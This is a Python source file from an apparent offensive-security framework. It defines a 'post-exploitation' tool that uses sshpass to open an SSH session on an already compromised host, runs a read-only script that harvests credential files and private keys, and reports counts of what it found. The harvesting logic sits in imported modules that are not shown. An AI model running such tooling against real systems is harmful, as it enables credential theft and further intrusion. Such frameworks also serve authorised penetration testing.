"""
Structured credential-file harvest over SSH on a host already reached
via some other foothold. One sshpass-driven session runs one fixed
read-only script over a bounded list of paths. Classified as
destructive: false (read-only on the remote host). Belongs to profile
'post-exploitation'.
"""
from __future__ import annotations

from typing import Any, Dict, List, Tuple

from tradecraft.adapters.local_credential_harvest import execute as ch_execute
from tradecraft.adapters.local_credential_harvest import parse as ch_parse
from tradecraft.tools.base import Tool


class LocalCredentialHarvest(Tool):
    tool_id = "local_credential_harvest"

    def is_available(self) -> bool:
        return ch_execute.find_sshpass_binary() is not None

    def run(self, target: str, ssh_user: str, ssh_pass: str) -> Dict[str, Any]:
        raw = ch_execute.execute(
            target=target, ssh_user=ssh_user, ssh_pass=ssh_pass
        )
        return ch_parse.parse_harvest_result(raw)

    def extract_facts(
        self, params: Dict[str, Any], result: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        if result.get("status") != "success":
            return []

        host, port = ch_parse.parse_host_port(params.get("target", ""))
        if not host:
            return []

        return [
            {
                "host": host,
                "port": port or 22,
                "protocol": "ssh",
                "local_credential_harvest_run": True,
                "local_credential_files_present": result.get("files_present", 0),
                "local_private_keys_found": result.get("private_keys_found", 0),
            }
        ]
